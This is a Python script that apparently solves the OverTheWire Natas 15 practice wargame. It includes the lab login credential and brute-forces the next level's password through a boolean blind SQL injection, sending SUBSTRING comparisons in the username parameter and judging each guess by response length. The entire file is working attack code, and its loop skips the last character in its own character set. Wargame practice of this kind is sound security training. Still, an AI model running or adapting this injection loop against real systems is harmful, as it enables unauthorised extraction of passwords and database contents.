import requests

## Variables to establish connection with server
url = 'http://natas15.natas.labs.overthewire.org/index.php'
username = 'natas15'
password = 'TTkaI7AWG4iDERztBcEyKV7kRXH1EZRB'

final_password = ""
chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890"

## Loop to iterate through every character for every index of the password
for i in range(1, 33):
    for j in range(0, 61):
        input_query = 'natas16" AND SUBSTRING(BINARY password,'+str(i)+',1)="'+ chars[j]+'" #'
        response = requests.get(url, auth=(username, password), params={"username":input_query})
        if(len(response.text)==913):
            final_password += chars[j]
            print("Char found:", chars[j])
            print("Password:", final_password)
            break

print(final_password)
